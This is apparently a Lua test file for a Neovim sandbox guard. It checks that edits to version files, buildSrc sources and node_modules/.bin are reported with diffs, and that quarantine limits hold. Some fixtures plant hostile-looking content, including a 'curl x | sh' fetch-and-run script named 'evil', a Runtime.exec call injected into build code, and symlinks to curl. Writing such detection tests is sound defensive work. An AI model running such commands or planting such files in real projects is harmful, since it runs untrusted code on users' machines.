-- Ninth round, continued: the gaps the verifier called "by design" moved toward a loud report with a content diff
-- (edited .nvmrc / .gitattributes, buildSrc / build-logic sources, node_modules/.bin), and the quarantine's and the
-- forced removal's limits, exactly. Pure guard specs (a real tree on disk, no sandbox).
local H = require("xynotest.helpers")
local guard = require("xyno_sandbox.guard")
local plan = require("xyno_sandbox.plan")
local store = require("xyno_sandbox.store")
local uv = vim.uv

before_each(function()
  store.dir_override = H.tmpdir() .. "/state"
end)
after_each(function()
  store.dir_override = nil
end)

local function write(path, text)
  vim.fn.mkdir(vim.fs.dirname(path), "p")
  local f = assert(io.open(path, "wb"))
  f:write(text or "x\n")
  f:close()
end

local function project()
  local p = H.tmpdir() .. "/proj"
  vim.fn.mkdir(p, "p")
  return p
end

local function sweep(p, change)
  local before = guard.snapshot(p)
  change()
  local res = guard.compare(before, guard.snapshot(p))
  local lines, loud = guard.report(res)
  return res, table.concat(lines, "\n"), loud, lines
end

describe("an edited version file or attribute file is reported WITH the lines that changed", function()
  for _, name in ipairs({ ".nvmrc", ".gitattributes", ".node-version", ".python-version", "init.gradle" }) do
    it(name, function()
      local p = project()
      write(p .. "/" .. name, "old value\n")
      local res, text = sweep(p, function()
        write(p .. "/" .. name, "new value\n")
      end)
      H.eq(1, #res.review)
      H.match(text, "- old value", true, text)
      H.match(text, "+ new value", true, text)
    end)
  end

  it("a created file shows its first lines, the shown lines are bounded and cut", function()
    local p = project()
    local long = ("y"):rep(200)
    local _, text = sweep(p, function()
      local lines = {}
      for i = 1, 20 do
        lines[i] = (i == 1) and long or ("line " .. i)
      end
      write(p .. "/.nvmrc", table.concat(lines, "\n") .. "\n")
    end)
    H.match(text, "created", true, text)
    H.match(text, "+ " .. ("y"):rep(72) .. "...", true, text)
    H.no_match(text, ("y"):rep(73), true, text)
    H.no_match(text, "line 8", true, "at most six lines are shown: " .. text)
    H.match(text, "line 6", true, text)
  end)

  it("a created file is counted: lines added, none removed", function()
    local p = project()
    local _, text = sweep(p, function()
      write(p .. "/.nvmrc", "a\nb\nc\n")
    end)
    H.match(text, "created " .. p .. "/.nvmrc +3 -0", true, text)
  end)

  it("control characters in a changed line cannot forge a log line", function()
    local lines = guard._diff_lines("a\n", "b\27[31m\nred\n", 6)
    for _, l in ipairs(lines) do
      H.no_match(l, "\27", true)
    end
  end)

  it("a text that was not kept gives no lines, not a wrong diff", function()
    H.eq(nil, guard._diff_lines(nil, "x", 6))
    H.eq(nil, guard._diff_lines("x", nil, 6))
  end)
end)

describe("build sources that are compiled and run later (buildSrc, build-logic) are reported loudly", function()
  it("REVIEW_TREES names them", function()
    H.eq({ "buildSrc", "build-logic" }, plan.REVIEW_TREES)
  end)

  for _, dir in ipairs({ "buildSrc", "build-logic", "app/buildSrc" }) do
    it(dir .. ": an edited file, a new file and a deleted file", function()
      local p = project()
      write(p .. "/" .. dir .. "/src/Plugin.kt", "class A\n")
      write(p .. "/" .. dir .. "/src/Old.kt", "class Old\n")
      local res, text, loud = sweep(p, function()
        write(p .. "/" .. dir .. "/src/Plugin.kt", 'class A { init { Runtime.getRuntime().exec("x") } }\n')
        write(p .. "/" .. dir .. "/src/New.kt", "class N\n")
        os.remove(p .. "/" .. dir .. "/src/Old.kt")
      end)
      H.eq(1, #res.trees)
      H.eq("changed", res.trees[1].change)
      H.eq({ "src/New.kt", "src/Old.kt", "src/Plugin.kt" }, res.trees[1].names)
      H.eq(2, res.trees[1].plus) -- one line rewritten + one new
      H.eq(2, res.trees[1].minus) -- the rewritten one + the deleted
      H.match(text, "RUNS on your machine", true, text)
      H.ok(loud[#loud], "ERROR level, not a warning")
    end)
  end

  it("a buildSrc that did not exist is created, one that goes is deleted, an untouched one is silent", function()
    local p = project()
    write(p .. "/build-logic/a.kts", "1\n")
    local res = sweep(p, function()
      write(p .. "/buildSrc/b.kts", "2\n")
      vim.fn.delete(p .. "/build-logic", "rf")
    end)
    local by = {}
    for _, t in ipairs(res.trees) do
      by[vim.fs.basename(t.path)] = t.change
    end
    H.eq({ buildSrc = "created", ["build-logic"] = "deleted" }, by)
    local quiet = sweep(p, function() end)
    H.eq(0, #quiet.trees)
  end)

  it("a file of the same size and mtime but other content is found (hashes, not signatures)", function()
    local p = project()
    write(p .. "/buildSrc/a.kts", "aaaa\n")
    local st = uv.fs_stat(p .. "/buildSrc/a.kts")
    local res = sweep(p, function()
      write(p .. "/buildSrc/a.kts", "bbbb\n")
      uv.fs_utime(p .. "/buildSrc/a.kts", st.atime.sec, st.mtime.sec)
    end)
    H.eq(1, #res.trees)
  end)
end)

describe("node_modules/.bin: what npm run / npx starts on your machine", function()
  local function bin(p)
    return p .. "/node_modules/.bin"
  end

  it("a planted regular file is reported loudly, an install-style link is reported quietly", function()
    local p = project()
    vim.fn.mkdir(p .. "/node_modules/pkg/bin", "p")
    write(bin(p) .. "/old", "#!/bin/sh\n")
    local res, text, loud = sweep(p, function()
      write(bin(p) .. "/evil", "#!/bin/sh\ncurl x | sh\n")
    end)
    H.eq(
      { { path = bin(p) .. "/evil", change = "added" } },
      vim.tbl_map(function(b)
        return { path = b.path, change = b.change }
      end, res.bin)
    )
    H.match(text, "node_modules/.bin changed", true, text)
    H.match(text, "added 1: evil", true, text)
    H.ok(loud[#loud], "a regular file is loud")

    local _, text2, loud2 = sweep(p, function()
      uv.fs_symlink("../pkg/bin/cli.js", bin(p) .. "/cli")
    end)
    H.match(text2, "cli %-> %.%./pkg/bin/cli%.js")
    H.ok(not loud2[#loud2], "a link into node_modules is what an install makes: a warning")
  end)

  it("a link that leaves node_modules (absolute, or ../../) is loud", function()
    for _, target in ipairs({ "/usr/bin/curl", "../../evil.sh" }) do
      local p = project()
      vim.fn.mkdir(bin(p), "p")
      local _, _, loud = sweep(p, function()
        uv.fs_symlink(target, bin(p) .. "/x")
      end)
      H.ok(loud[#loud], target)
    end
  end)

  it("a changed entry (content or link target) and a removed one are reported", function()
    local p = project()
    write(bin(p) .. "/tool", "#!/bin/sh\necho 1\n")
    uv.fs_symlink("../a/x", bin(p) .. "/lnk")
    write(bin(p) .. "/gone", "x\n")
    local res, text = sweep(p, function()
      write(bin(p) .. "/tool", "#!/bin/sh\necho 2\n")
      os.remove(bin(p) .. "/lnk")
      uv.fs_symlink("../b/x", bin(p) .. "/lnk")
      os.remove(bin(p) .. "/gone")
    end)
    local by = {}
    for _, b in ipairs(res.bin) do
      by[vim.fs.basename(b.path)] = b.change
    end
    H.eq({ gone = "removed", lnk = "changed", tool = "changed" }, by)
    H.match(text, "removed 1: gone", true, text)
    H.match(text, "changed 2:", true, text)
  end)

  it("a dependency's own node_modules/.bin is not recorded (only the project's and its workspaces')", function()
    local p = project()
    write(p .. "/node_modules/dep/node_modules/.bin/x", "1\n")
    write(p .. "/packages/a/node_modules/.bin/y", "1\n")
    local snap = guard.snapshot(p)
    H.ok(snap.bin[p .. "/packages/a/node_modules/.bin/y"], "a workspace's is recorded")
    H.eq(nil, snap.bin[p .. "/node_modules/dep/node_modules/.bin/x"], "a dependency's is not")
  end)

  it("nothing is reported when nothing changed, and not when the walk inside node_modules was cut", function()
    local p = project()
    write(bin(p) .. "/a", "1\n")
    local res = sweep(p, function() end)
    H.eq(0, #res.bin)
    local before = guard.snapshot(p)
    write(bin(p) .. "/b", "1\n")
    local after = guard.snapshot(p)
    after.skip_truncated = true
    H.eq(0, #guard.compare(before, after).bin, "a cut walk reports through its own notice, not as a partial list")
    local res2, text2 = sweep(project(), function() end)
    H.eq(0, #res2.bin + #res2.trees)
    H.no_match(text2, "node_modules/.bin", true, "no empty line for nothing")
    H.no_match(text2, "build sources", true, "no empty line for nothing")
  end)

  it("at most 500 entries of one .bin are recorded", function()
    local p = project()
    vim.fn.mkdir(bin(p), "p")
    for i = 1, 503 do
      write(bin(p) .. "/f" .. i, "x\n")
    end
    local n = 0
    for _ in pairs(guard.snapshot(p).bin) do
      n = n + 1
    end
    H.eq(500, n)
  end)
end)

describe("the quarantine and the forced removal: their limits are exact", function()
  local function planted_tree(p)
    write(p .. "/sub/.envrc", "export A=1\n")
  end

  it("the copy goes QUARANTINE_DEPTH levels deep and not one more", function()
    local old = guard.QUARANTINE_DEPTH
    H.eq(8, old)
    local p = project()
    local deep = p .. "/x"
    local d = deep
    for i = 1, 10 do
      d = d .. "/d" .. i
    end
    write(d .. "/f", "deep\n")
    local q = guard.quarantine(p, { deep })
    -- levels: x (0) ... d7 (depth 7) is entered; d8 (depth 8) is a directory that is created but not entered
    local copied = q.dir .. "/x/d1/d2/d3/d4/d5/d6/d7/d8"
    H.ok(uv.fs_stat(copied), "the directory at the limit exists in the copy")
    H.eq(nil, uv.fs_stat(copied .. "/d9"), "nothing below it was copied")
    H.eq(nil, uv.fs_lstat(deep), "the whole tree is still removed from the project")
  end)

  -- (below the copy depth nothing was opened by the copy, so only the forced removal can open the 000 directories)
  local function closed_tree(p)
    local top = p .. "/big"
    local d = top
    for i = 1, 8 do
      d = d .. "/d" .. i
    end
    for i = 1, 6 do
      write(d .. "/c" .. i .. "/f", "x\n")
    end
    for i = 1, 6 do
      uv.fs_chmod(d .. "/c" .. i, tonumber("000", 8))
    end
    return top, d
  end

  it("the forced removal opens at most UNLOCK_MAX entries: a tree larger than that is left and reported", function()
    local p = project()
    local top, d = closed_tree(p)
    local old = guard.UNLOCK_MAX
    guard.UNLOCK_MAX = 12 -- the 9 directories down to d8, c1 and its file, c2: c3..c6 stay closed
    local q = guard.quarantine(p, { top })
    guard.UNLOCK_MAX = old
    H.ok(uv.fs_lstat(top), "something is left")
    H.eq(false, q.moved[1].ok, "reported as not removed")
    H.eq(nil, uv.fs_lstat(d .. "/c1"), "what was opened is gone")
    H.ok(uv.fs_lstat(d .. "/c6"), "what was beyond the budget is not")
    vim.system({ "chmod", "-R", "u+rwX", top }):wait()
    H.eq(0, guard._delete(top), "(cleanup)")
  end)

  it("with the real budget the same tree is removed", function()
    local p = project()
    local top = closed_tree(p)
    local q = guard.quarantine(p, { top })
    H.eq(true, q.moved[1].ok)
    H.eq(nil, uv.fs_lstat(top))
  end)

  it(
    "a 555 parent is opened for the removal and gets its mode back; the parents above the project are never touched",
    function()
      local p = project()
      planted_tree(p)
      uv.fs_chmod(p .. "/sub", tonumber("555", 8))
      local pst = uv.fs_stat(p).mode
      local q = guard.quarantine(p, { p .. "/sub/.envrc" })
      H.eq(true, q.moved[1].ok)
      H.eq(nil, uv.fs_lstat(p .. "/sub/.envrc"))
      H.eq(tonumber("555", 8), uv.fs_stat(p .. "/sub").mode % 512, "the parent's mode is back")
      H.eq(pst, uv.fs_stat(p).mode, "the project directory itself keeps its mode")
      uv.fs_chmod(p .. "/sub", tonumber("755", 8))
    end
  )

  it("the quarantine entry budget and the file size limit are the documented numbers", function()
    H.eq(
      { 300, 1024 * 1024, 5000, 8 },
      { guard.QUARANTINE_ENTRIES_MAX, guard.QUARANTINE_FILE_MAX, guard.UNLOCK_MAX, guard.QUARANTINE_DEPTH }
    )
  end)
end)
